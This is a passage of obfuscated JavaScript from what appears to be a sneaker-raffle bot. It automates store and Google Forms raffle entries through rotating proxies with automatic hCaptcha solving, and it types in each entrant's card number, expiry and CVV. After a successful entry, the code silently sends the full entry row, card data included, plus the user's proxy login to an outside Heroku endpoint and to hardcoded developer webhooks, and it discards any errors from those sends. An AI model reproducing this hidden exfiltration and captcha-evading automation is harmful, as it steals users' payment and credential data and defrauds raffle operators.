                        await _0x437e8(_0x5d3f08, _0x3e6a79);
                    } catch {
                        _0x372bcc = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x5d3f08[_0x3e6a79]['Email'] == '' || _0x5d3f08[_0x3e6a79]['FirstName'] == '' || _0x5d3f08[_0x3e6a79]['LastName'] == '' || _0x5d3f08[_0x3e6a79]['Country'] == '' || _0x5d3f08[_0x3e6a79]['Size'] == '' || _0x5d3f08[_0x3e6a79]['Address1'] == '' || _0x5d3f08[_0x3e6a79]['Zip'] == '') {
                        console['log'](_0x1a8584() + '\x20[' + _0x5aa907['name'] + ']\x20Task\x20' + (_0x3e6a79 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x5d3f08[_0x3e6a79]['Email'] == '' || _0x5d3f08[_0x3e6a79]['FirstName'] == '' || _0x5d3f08[_0x3e6a79]['LastName'] == '' || _0x5d3f08[_0x3e6a79]['Country'] == '' || _0x5d3f08[_0x3e6a79]['Size'] == '' || _0x5d3f08[_0x3e6a79]['Address1'] == '' || _0x5d3f08[_0x3e6a79]['Zip'] == '' || _0x5d3f08[_0x3e6a79]['Phone'] == '') {
                        console['log'](_0x1a8584() + '\x20[' + _0x5aa907['name'] + ']\x20Task\x20' + (_0x3e6a79 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x147e68 = '' + _0x5d3f08[_0x3e6a79]['Url'];
                    if (_0x4558f2['useRandomProxy'] = ![])
                        var _0x19f320 = _0x596683[_0x3e6a79]['split'](':');
                    else
                        var _0x162409 = Math['round'](Math['random']() * (_0x596683['length'] - 0x1)), _0x19f320 = _0x596683[_0x162409]['split'](':');
                    var _0x3f9688;
                    try {
                        _0x3f9688 = await _0x16ed0a['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x19f320[0x0] + ':' + _0x19f320[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x3f9688 = await _0x16ed0a['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x19f320[0x0] + ':' + _0x19f320[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x530d2f = await _0x3f9688['newPage']();
                        await _0x530d2f['authenticate']({
                            'username': '' + _0x19f320[0x2],
                            'password': '' + _0x19f320[0x3]
                        }), console['log'](_0x1a8584() + '\x20[' + _0x5aa907['name'] + ']\x20Task\x20' + (_0x3e6a79 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x530d2f['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x530d2f['setRequestInterception'](!![]), _0x530d2f['on']('request', _0x3b0125 => {
                            _0x3b0125['resourceType']() === 'image' || _0x3b0125['resourceType']() === 'font' || _0x3b0125['resourceType']() === 'media' ? _0x3b0125['abort']() : _0x3b0125['continue']();
                        });
                        try {
                            await _0x530d2f['goto'](_0x147e68), await _0x1e21d2(0xbb8), await _0x530d2f['waitForSelector']('.control__JhutY');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x530d2f['click']('.control__JhutY'), await _0x1e21d2(0x1f4);
                        if (_0x5d3f08[_0x3e6a79]['Size'] != 'RANDOM')
                            try {
                                const _0x2bbb18 = await _0x530d2f['$x']('//div[contains(text(),\x20\x27' + _0x5d3f08[_0x3e6a79]['Size'] + '\x27)]');
                                await _0x2bbb18[0x0]['click']();
                            } catch {
                                console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x5aa907['name'] + ']\x20Task\x20' + (_0x3e6a79 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x32babb = await _0x530d2f['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0xc3b9f7 = Math['round'](Math['random']() * (_0x32babb['length'] - 0x1));
                            await _0x32babb[_0xc3b9f7]['click']();
                        }
                        await _0x1e21d2(0x4b0);
                        const _0x5649ee = await _0x530d2f['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x5649ee[0x0]['click'](), await _0x530d2f['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x1a8584() + '\x20[' + _0x5aa907['name'] + ']\x20Task\x20' + (_0x3e6a79 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x530d2f['type']('input[name=\x22email\x22]', '' + _0x5d3f08[_0x3e6a79]['Email']), await _0x1e21d2(0x640), await _0x530d2f['type']('input[name=\x22phone\x22]', '' + _0x5d3f08[_0x3e6a79]['Phone']), await _0x1e21d2(0x4b0), await _0x530d2f['click']('button.btn.continue-button__1RtsS'), await _0x1e21d2(0x4b0);
                        try {
                            await _0x530d2f['type']('input[name=\x22firstName\x22]', '' + _0x5d3f08[_0x3e6a79]['FirstName']), await _0x1e21d2(0x258);
                        } catch {
                            const _0x5245b = await _0x530d2f['$$eval']('.invalid-feedback\x20>\x20div', _0x3cbe5e => {
                                return _0x3cbe5e['map'](_0x17b4e9 => _0x17b4e9['innerText']);
                            });
                            console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x5aa907['name'] + ']\x20Task\x20' + (_0x3e6a79 + 0x1) + '\x20:\x20' + _0x5245b));
                            continue;
                        }
                        await _0x530d2f['type']('input[name=\x22lastName\x22]', '' + _0x5d3f08[_0x3e6a79]['LastName']), await _0x1e21d2(0xc8), await _0x530d2f['type']('input[name=\x22instagramUsername\x22]', '' + _0x5d3f08[_0x3e6a79]['Follower']), await _0x1e21d2(0x4b0), await _0x530d2f['click']('button.btn.continue-button__1RtsS'), await _0x1e21d2(0x3e8), console['log'](_0x1a8584() + '\x20[' + _0x5aa907['name'] + ']\x20Task\x20' + (_0x3e6a79 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x530d2f['select']('select[name=\x22country\x22]', '' + _0x5d3f08[_0x3e6a79]['Country']), await _0x1e21d2(0x2bc), await _0x530d2f['type']('input[name=\x22streetName\x22]', '' + _0x5d3f08[_0x3e6a79]['Address1']), await _0x1e21d2(0x258), await _0x530d2f['type']('input[name=\x22houseNumber\x22]', _0x5d3f08[_0x3e6a79]['HouseNumber'] + '\x20' + _0x5d3f08[_0x3e6a79]['Address2']), await _0x1e21d2(0xc8), await _0x530d2f['type']('input[name=\x22postalCode\x22]', '' + _0x5d3f08[_0x3e6a79]['Zip']), await _0x1e21d2(0x1f4), await _0x530d2f['type']('input[name=\x22city\x22]', '' + _0x5d3f08[_0x3e6a79]['City']), await _0x1e21d2(0x4b0), await _0x530d2f['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x1e21d2(0x4b0), await _0x530d2f['click']('button.btn.continue-button__1RtsS'), await _0x1e21d2(0x4b0), console['log'](_0x1a8584() + '\x20[' + _0x5aa907['name'] + ']\x20Task\x20' + (_0x3e6a79 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x530d2f['solveRecaptchas'](), console['log'](_0x1a8584() + '\x20[' + _0x5aa907['name'] + ']\x20Task\x20' + (_0x3e6a79 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x1e21d2(0xbb8), await _0x530d2f['click']('button.btn.continue-button__1RtsS'), await _0x1e21d2(0x1388), console['log'](_0x1a8584() + '\x20[' + _0x5aa907['name'] + ']\x20Task\x20' + (_0x3e6a79 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x530d2f['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x530d2f['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x1e21d2(0x4b0), await _0x530d2f['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x5d3f08[_0x3e6a79]['CardNumber']), await _0x1e21d2(0x320), await _0x530d2f['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x530d2f['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x5d3f08[_0x3e6a79]['ExpiryDate']), await _0x1e21d2(0x4b0), await _0x530d2f['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x530d2f['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x5d3f08[_0x3e6a79]['CVV']), await _0x1e21d2(0x226), await _0x530d2f['type']('input[name=\x22holderName\x22]', '' + _0x5d3f08[_0x3e6a79]['NameOnCard']), await _0x1e21d2(0x226), await _0x530d2f['click']('button.adyen-checkout__button'), console['log'](_0x1a8584() + '\x20[' + _0x5aa907['name'] + ']\x20Task\x20' + (_0x3e6a79 + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x530d2f['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x1e21d2(0xbb8);
                        } catch (_0x12d08e) {
                            console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x5aa907['name'] + ']\x20Task\x20' + (_0x3e6a79 + 0x1) + '\x20:\x203DS\x20Failed')), _0x2d6c82 = '3DS\x20Error\x20' + _0x12d08e;
                            var _0x2dd45b = await _0x3d56af(_0x5d3f08[_0x3e6a79], _0x5aa907, 'dev', !![], _0x2d6c82);
                            _0x769804['errorDEV'] = { 'embeds': [_0x2dd45b] };
                            _0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '' && await _0xa0452b(_0x4558f2['webhook'], _0x769804['errorDEV']);
                            await _0xa0452b(_0x5522d1, _0x769804['errorDEV']);
                            continue;
                        }
                        _0x406375(_0x5d3f08[_0x3e6a79], _0x5aa907), console['log'](_0x31f5da['green'](_0x1a8584() + '\x20[' + _0x5aa907['name'] + ']\x20Task\x20' + (_0x3e6a79 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        let _0x3b2782 = _0x5d3f08[_0x3e6a79];
                        try {
                            prxdata = {
                                'username': _0xf4f7bc['replace']('#', ''),
                                'module': _0x5aa907['name'],
                                'entrydata': JSON['stringify'](_0x3b2782),
                                'proxy': '' + _0x596683[_0x3e6a79]
                            };
                            var _0x4b01f3 = JSON['stringify'](prxdata);
                            let _0x4ddcbb = { 'headers': { 'content-type': 'application/json' } };
                            await _0x8ae996['post']('https://jraffles.herokuapp.com/success', _0x4b01f3, _0x4ddcbb);
                        } catch (_0x1d9e46) {
                        }
                        if (_0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '')
                            try {
                                await _0xa0452b(_0x4558f2['webhook'], _0x769804['succesDEVMSG']);
                            } catch {
                            }
                        await _0x1e21d2(0xc8), await _0xa0452b(_0x258e47, _0x769804['succesDEVMSG']), await _0x1e21d2(0xc8);
                        try {
                            await _0xa0452b(_0x28ff05, _0x769804['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0xa727e8) {
                        console['log'](_0x1a8584() + '\x20[' + _0x5aa907['name'] + ']\x20Task\x20' + (_0x3e6a79 + 0x1) + '\x20:\x20' + _0xa727e8), _0x2d6c82 = '' + _0xa727e8;
                        var _0x2dd45b = await _0x3d56af(_0x5d3f08[_0x3e6a79], _0x5aa907, 'dev', !![], _0x2d6c82);
                        _0x769804['errorDEV'] = { 'embeds': [_0x2dd45b] }, _0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '' && await _0xa0452b(_0x4558f2['webhook'], _0x769804['errorDEV']), await _0xa0452b(_0x5522d1, _0x769804['errorDEV']), _0x372bcc = 'yes';
                    } finally {
                        _0x3f9688['close']();
                        if (_0x372bcc == 'yes' && _0x140cf3 != 0x5) {
                            console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x5aa907['name'] + ']\x20Task\x20' + (_0x3e6a79 + 0x1) + '\x20:\x20Retrying\x20(' + _0x140cf3 + '\x20/\x205)')), _0x3e6a79 = _0x3e6a79 - 0x1, _0x140cf3 = _0x140cf3 + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x4558f2['delay'] + '\x20ms'), await _0x1e21d2(_0x4558f2['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'Google\x20Forms',
        'modules': [{
            'name': 'SMART\x20ENTRIES',
            'store': 'Google\x20Forms',
            'logo': 'https://www.pngplay.com/wp-content/uploads/13/Google-Logo-PNG-HD-Quality.png',
            'function': async function (_0x14cd77, _0x580013, _0x31effe) {
                let _0x58f259 = {
                    'FirstName': '',
                    'LastName': '',
                    'Email': '',
                    'Country': '',
                    'Address': '',
                    'City': '',
                    'Zip': '',
                    'Size': '',
                    'Phone': ''
                };
                var _0x4f20d3 = _0x534d99['readFileSync']('forms/templates.json', 'utf-8');
                let _0x338b36 = JSON['parse'](_0x4f20d3), _0x485987 = ![];
                if (_0x338b36['length'] != 0x0) {
                    let _0x1a1518 = 0x0;
                    for (template of _0x338b36) {
                        if (template['Url'] == _0x580013[0x0]['Url']) {
                            _0x485987 = !![], console['log'](_0x31f5da['yellow']('Would\x20you\x20like\x20to\x20use\x20this\x20template?'));
                            for (key in template) {
                                key != 'Url' && !key['includes']('Select') && !key['includes']('custom') && template[key] != '' && console['log'](template[key] + ':\x20' + _0x31f5da['cyan'](key)), (key['includes']('Select') || key['includes']('custom')) && console['log'](template[key]['title'] + ':\x20' + _0x31f5da['cyan'](template[key]['answer']));
                            }
                            console['log']();
                            async function _0x6a9b28() {
                                let _0xf13f70 = await _0x402a5d['get']('answer');
                                if (_0xf13f70['answer']['toLowerCase']() != 'y' && _0xf13f70['answer']['toLowerCase']() != 'n')
                                    return console['log']('Invalid\x20Selection'), _0x6a9b28();
                                return _0xf13f70['answer']['toLowerCase']();
                            }
                            if (await _0x6a9b28() == 'n') {
                                _0x338b36['splice'](_0x1a1518, 0x1), console['clear']();
                                break;
                            }
                            _0x58f259 = template, console['clear']();
                            break;
                        }
                        _0x1a1518++;
                    }
                }
                let _0x209a59 = 0x0, _0x4b7062 = 0x0;
                function _0x3f88fc(_0x55601d) {
                    console['log'](_0x1a8584() + '\x20[' + _0x14cd77['name'] + ']\x20Task\x20' + (_0x17d38b + 0x1) + '\x20:\x20' + _0x55601d);
                }
                var _0x17786e = 0x0;
                for (key in _0x58f259) {
                    if (key['includes']('custom'))
                        _0x209a59++;
                    if (key['includes']('Select'))
                        _0x4b7062++;
                }
                for (var _0x17d38b = 0x0; _0x17d38b < _0x580013['length']; _0x17d38b++) {
                    _0x58f259['Url'] = _0x580013[_0x17d38b]['Url'];
                    let _0x82cbd9 = ![];
                    if (_0x338b36['length'] != 0x0)
                        for (template of _0x338b36) {
                            if (template['Url'] == _0x580013[_0x17d38b]['Url']) {
                                _0x58f259 = template, _0x82cbd9 = !![], _0x3f88fc('Found\x20Template');
                                break;
                            }
                        }
                    var _0x2d571f;
                    if (_0x5565fc != 'yes') {
                        if (!_0x5565fc)
                            var _0x5565fc = '';
                        else
                            _0x5565fc = '';
                        _0x17786e = 0x0;
                    }
                    try {
                        await _0x437e8(_0x580013, _0x17d38b);
                    } catch {
                        _0x5565fc = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x4558f2['useRandomProxy'] = ![])
                        var _0x42c264 = _0x31effe[_0x17d38b]['split'](':');
                    else
                        var _0x40622d = Math['round'](Math['random']() * (_0x31effe['length'] - 0x1)), _0x42c264 = _0x31effe[_0x40622d]['split'](':');
                    var _0x368fc8;
                    if (_0x42c264['length'] == 0x1)
                        try {
                            _0x368fc8 = await _0x16ed0a['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x368fc8 = await _0x16ed0a['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ],
                                'env': { 'LANGUAGE': 'en-US' }
                            });
                        }
                    else
                        try {
                            _0x368fc8 = await _0x16ed0a['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x42c264[0x0] + ':' + _0x42c264[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x368fc8 = await _0x16ed0a['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x42c264[0x0] + ':' + _0x42c264[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ],
                                'env': { 'LANGUAGE': 'en-US' }
                            });
                        }
                    try {
                        let _0x4850df = { 'first': ![] };
                        const _0x8ef59e = await _0x368fc8['newPage']();
                        if (_0x42c264['length'] != 0x0)
                            await _0x8ef59e['authenticate']({
                                'username': '' + _0x42c264[0x2],
                                'password': '' + _0x42c264[0x3]
                            });
                        _0x3f88fc('Getting\x20Session');
                        let _0x5a712e = ![];
                        try {
                            await _0x8ef59e['goto'](_0x580013[_0x17d38b]['Url'], {
                                'waitUntil': 'load',
                                'timeout': 0x0
                            }), await _0x1e21d2(0xbb8);
                        } catch (_0x350a91) {
                            throw new Error(_0x350a91);
                        }
                        const _0x4d6267 = await _0x8ef59e['$']('body\x20>\x20div.llhEMd.iWO5td\x20>\x20div\x20>\x20div.g3VIld.Up8vH.J9Nfi.iWO5td\x20>\x20div.XfpsVe.J9fJmf');
                        if (_0x4d6267) {
                            _0x3f88fc('Login\x20Detected');
                            let _0x1123ed = await _0x4d6267['$']('div[data-id=\x22EBS5u\x22]');
                            await _0x1123ed['click'](), _0x5a712e = !![];
                        }
                        let _0x472117 = await _0x8ef59e['$']('#identifierId');
                        _0x472117 && (_0x5a712e = !![]);
                        await _0x8ef59e['waitForSelector']('.teQAzf');
                        async function _0x27380a() {
                            let _0x10e060 = await _0x8ef59e['$$']('.o3Dpx\x20>\x20div[role=\x22listitem\x22]');
                            for (question of _0x10e060) {
                                let _0x2f5aa3;
                                try {
                                    _0x2f5aa3 = await question['$eval']('.M7eMe', _0x2dabaa => _0x2dabaa['textContent']);
                                } catch {
                                    continue;
                                }
                                if (_0x209a59 != 0x0) {
                                    let _0x536c5e = ![];
                                    for (let _0x138e7d = 0x0; _0x138e7d < _0x209a59; _0x138e7d++) {
                                        if (_0x2f5aa3 == _0x58f259['custom' + _0x138e7d]['title']) {
                                            _0x3f88fc('Custom\x20Selector\x20found;\x20' + _0x2f5aa3);
                                            let _0x18e486 = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x3c7a9d = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                            if (_0x18e486)
                                                await _0x18e486['type']('' + _0x58f259['custom' + _0x138e7d]['answer']);
                                            else
                                                _0x3c7a9d && await _0x3c7a9d['type']('' + _0x58f259['custom' + _0x138e7d]['answer']);
                                            _0x536c5e = !![];
                                            break;
                                        }
                                    }
                                    if (_0x536c5e) {
                                        await _0x1e21d2(0x15e);
                                        continue;
                                    }
                                }
                                if (_0x4b7062 != 0x0) {
                                    let _0x601876 = ![];
                                    for (let _0x3484c9 = 0x0; _0x3484c9 < _0x4b7062; _0x3484c9++) {
                                        if (_0x2f5aa3 == _0x58f259[_0x3484c9 + 'Select']['title']) {
                                            _0x3f88fc('Custom\x20Selector\x20found;\x20' + _0x2f5aa3);
                                            let _0x36384c = await question['$$']('.ulDsOb');
                                            for (opt of _0x58f259[_0x3484c9 + 'Select']['answer']) {
                                                let _0x3c5151 = await _0x36384c[opt]['$']('span');
                                                await _0x3c5151['click']();
                                            }
                                            _0x601876 = !![];
                                            break;
                                        }
                                    }
                                    if (_0x601876) {
                                        await _0x1e21d2(0x15e);
                                        continue;
                                    }
                                }
                                try {
                                    if (_0x2f5aa3 == _0x58f259['0Select']['title']) {
                                        _0x3f88fc('Custom\x20Selector\x20found;\x20' + _0x58f259['0Select']['title']);
                                        let _0x329b0a = await question['$$']('.ulDsOb'), _0x5245df = await _0x329b0a[_0x58f259['0Select']['answer']];
                                        await _0x5245df['click']();
                                        continue;
                                    }
                                    if (_0x2f5aa3 == _0x58f259['1Select']['title']) {
                                        _0x3f88fc('Custom\x20Selector\x20found;\x20' + _0x58f259['1Select']['title']);
                                        let _0x2350f2 = await question['$$']('.ulDsOb'), _0x206317 = await _0x2350f2[_0x58f259['1Select']['answer']];
                                        await _0x206317['click']();
                                        continue;
                                    }
                                    if (_0x2f5aa3 == _0x58f259['2Select']['title']) {
                                        _0x3f88fc('Custom\x20Selector\x20found;\x20' + _0x58f259['2Select']['title']);
                                        let _0x5ac63d = await question['$$']('.ulDsOb'), _0x414761 = await _0x5ac63d[_0x58f259['2Select']['answer']];
                                        await _0x414761['click']();
                                        continue;
                                    }
                                } catch (_0x4a7c45) {
                                }
                                if (_0x2f5aa3['toLowerCase']()['includes']('mail') && !_0x2f5aa3['toLowerCase']()['includes']('agree') || _0x2f5aa3 == _0x58f259['Email']) {
                                    _0x3f88fc('Mail\x20Selector\x20found;\x20' + _0x2f5aa3);
                                    let _0x545333 = await question['$']('input');
                                    !_0x545333 && (_0x545333 = await question['$']('textarea[jsname=\x22YPqjbf\x22]'));
                                    await _0x545333['type'](_0x580013[_0x17d38b]['Email']), await _0x1e21d2(0x258);
                                    continue;
                                }
                                if (_0x2f5aa3['toLowerCase']()['includes']('first') || _0x2f5aa3['toLowerCase']() == 'name' || _0x2f5aa3['toLowerCase']() == 'name\x20' || _0x2f5aa3 == _0x58f259['FirstName']) {
                                    _0x3f88fc('FirstName\x20Selector\x20found;\x20' + _0x2f5aa3);
                                    let _0x41a939 = await question['$']('input');
                                    !_0x41a939 && (_0x41a939 = await question['$']('textarea'));
                                    await _0x41a939['type'](_0x580013[_0x17d38b]['FirstName'] + '\x20'), await _0x1e21d2(0x258);
                                    if (_0x2f5aa3 == _0x58f259['FirstName'])
                                        continue;
                                }
                                if (_0x2f5aa3['toLowerCase']()['includes']('last') || _0x2f5aa3['toLowerCase']()['includes']('surname') || _0x2f5aa3 == _0x58f259['LastName']) {
                                    _0x3f88fc('LastName\x20Selector\x20found;\x20' + _0x2f5aa3);
                                    let _0xe828eb = await question['$']('input');
                                    !_0xe828eb && (_0xe828eb = await question['$']('textarea'));
                                    await _0xe828eb['type'](_0x580013[_0x17d38b]['LastName'] + '\x20'), await _0x1e21d2(0x258);
                                    continue;
                                }
                                if (_0x2f5aa3['toLowerCase']()['includes']('address') && !_0x2f5aa3['toLowerCase']()['includes']('agree') || _0x2f5aa3 == _0x58f259['Address']) {
                                    _0x3f88fc('Address\x20Selector\x20found;\x20' + _0x2f5aa3);
                                    let _0x55e9da = await question['$']('input');
                                    !_0x55e9da && (_0x55e9da = await question['$']('textarea'));
                                    await _0x55e9da['type'](_0x580013[_0x17d38b]['Address1'] + '\x20' + _0x580013[_0x17d38b]['HouseNumber'] + '\x20' + _0x580013[_0x17d38b]['Address2']), await _0x1e21d2(0x258);
                                    continue;
                                }
                                if (_0x2f5aa3['toLowerCase']()['includes']('phone') || _0x2f5aa3['toLowerCase']()['includes']('mobile') || _0x2f5aa3 == _0x58f259['Phone']) {
                                    _0x3f88fc('Phone\x20Selector\x20found;\x20' + _0x2f5aa3);
                                    let _0x463f5f = await question['$']('input');
                                    !_0x463f5f && (_0x463f5f = await question['$']('textarea'));
                                    await _0x463f5f['type']('' + _0x580013[_0x17d38b]['Phone']), await _0x1e21d2(0x258);
                                    continue;
                                }
                                if (_0x2f5aa3['toLowerCase']()['includes']('country') || _0x2f5aa3 == _0x58f259['Country']) {
                                    let _0x34d3d1 = await question['$']('div[jsname=\x22wCJL8\x22]');
                                    if (_0x34d3d1) {
                                        let _0x18e7fc = ![], _0x1adbee = await _0x34d3d1['$$']('.ulDsOb');
                                        for (option of _0x1adbee) {
                                            let _0x497b45 = await option['$']('span'), _0x7b3cea = await option['$eval']('span', _0x133996 => _0x133996['textContent']);
                                            if (_0x7b3cea['toLowerCase']() == _0x580013[_0x17d38b]['Country']['toLowerCase']()) {
                                                await _0x497b45['click'](), _0x18e7fc = !![];
                                                break;
                                            }
                                        }
                                        if (!_0x18e7fc) {
                                            const _0x3ff081 = await question['$']('.Hvn9fb.zHQkBf');
                                            await _0x3ff081['click'](), await _0x3ff081['type'](_0x580013[_0x17d38b]['Country']);
                                        }
                                        continue;
                                    }
                                    _0x3f88fc('Country\x20Selector\x20found;\x20' + _0x2f5aa3);
                                    let _0x415b3b = await question['$']('input');
                                    !_0x415b3b && (_0x415b3b = await question['$']('textarea'));
                                    await _0x415b3b['type']('' + _0x580013[_0x17d38b]['Country']), await _0x1e21d2(0x258);
                                    continue;
                                }
                                if (_0x2f5aa3['toLowerCase']()['includes']('city') || _0x2f5aa3 == _0x58f259['City']) {
                                    _0x3f88fc('City\x20Selector\x20found;\x20' + _0x2f5aa3);
                                    let _0x5a2944 = await question['$']('input');
                                    !_0x5a2944 && (_0x5a2944 = await question['$']('textarea'));
                                    await _0x5a2944['type']('' + _0x580013[_0x17d38b]['City']), await _0x1e21d2(0x258);
                                    continue;
                                }
                                if (_0x2f5aa3['toLowerCase']()['includes']('zip') || _0x2f5aa3 == _0x58f259['Zip']) {
                                    _0x3f88fc('Zip\x20Selector\x20found;\x20' + _0x2f5aa3);
                                    let _0x1250b6 = await question['$']('input');
                                    !_0x1250b6 && (_0x1250b6 = await question['$']('textarea'));
                                    await _0x1250b6['type']('' + _0x580013[_0x17d38b]['Zip']), await _0x1e21d2(0x258);
                                    continue;
                                }
                                if (_0x2f5aa3['toLowerCase']()['includes']('insta') || _0x2f5aa3 == _0x58f259['Follower']) {
                                    _0x3f88fc('Follower\x20Selector\x20found;\x20' + _0x2f5aa3);
                                    let _0x5991df = await question['$']('input');
                                    !_0x5991df && (_0x5991df = await question['$']('textarea'));
                                    await _0x5991df['type']('' + _0x580013[_0x17d38b]['Follower']), await _0x1e21d2(0x258);
                                    continue;
                                }
                                if (_0x2f5aa3['toLowerCase']()['includes']('size') || _0x2f5aa3 == _0x58f259['Size']) {
                                    _0x3f88fc('Size\x20Selector\x20found;\x20' + _0x2f5aa3);
                                    let _0x4663ab = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x4663ab) {
                                        let _0x3932dc = await _0x4663ab['$$']('.ulDsOb');
                                        if (_0x580013[_0x17d38b]['Size']['toLowerCase']() == 'random') {
                                            var _0xb1e77f = Math['round'](Math['random']() * (_0x3932dc['length'] - 0x1));
                                            await _0x3932dc[_0xb1e77f]['click']();
                                        } else
                                            for (size of _0x3932dc) {
                                                let _0x3439ae = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x452270 => _0x452270['textContent']);
                                                if (_0x3439ae['toLowerCase']()['includes'](_0x580013[_0x17d38b]['Size'])) {
                                                    await size['click']();
                                                    break;
                                                }
                                            }
                                    }
                                    let _0x45d4fb = await question['$']('.ry3kXd');
                                    if (_0x45d4fb) {
                                        await _0x45d4fb['click'](), await _0x1e21d2(0x9c4);
                                        let _0x483814 = await _0x8ef59e['$']('div[jsname=\x22V68bde\x22]'), _0x502dd4 = await _0x483814['$$']('div[jsname=\x22wQNmvb\x22]');
                                        for (size of _0x502dd4) {
                                            let _0x20d84f = await size['$eval']('.vRMGwf.oJeWuf', _0x264ffa => _0x264ffa['textContent']), _0xd171e8 = await size['$']('.vRMGwf.oJeWuf');
                                            if (_0x20d84f['toLowerCase']()['includes'](_0x580013[_0x17d38b]['Size'])) {
                                                await _0x1e21d2(0x190), await _0xd171e8['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x1e21d2(0x258);
                                    continue;
                                }
                                if (_0x2f5aa3['toLowerCase']()['includes']('receive') || _0x2f5aa3['toLowerCase']()['includes']('method')) {
                                    _0x3f88fc('Method\x20Selector\x20found;\x20' + _0x2f5aa3);
                                    let _0x9e0f70 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x9e0f70) {
                                        const _0x17a34e = await _0x9e0f70['$$']('.ulDsOb');
                                        for (size of _0x17a34e) {
                                            let _0x45cbdd = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x5dbbc8 => _0x5dbbc8['textContent']);
                                            if (_0x45cbdd['toLowerCase']()['includes']('shipping')) {
                                                await size['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x1e21d2(0x258);
                                    continue;
                                }
                                if (_0x2f5aa3['toLowerCase']()['includes']('offers') || _0x2f5aa3['toLowerCase']()['includes']('agree')) {
                                    _0x3f88fc('Authorization\x20Selector\x20found;\x20' + _0x2f5aa3);
                                    const _0x1a9142 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x1a9142) {
                                        const _0x56d2f0 = await _0x1a9142['$$']('.ulDsOb');
                                        for (size of _0x56d2f0) {
                                            let _0x12e9e2 = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x25fdde => _0x25fdde['textContent']);
                                            if (_0x12e9e2['toLowerCase']()['includes']('authorize') || _0x12e9e2['toLowerCase']()['includes']('yes')) {
                                                await size['click']();
                                                break;
                                            }
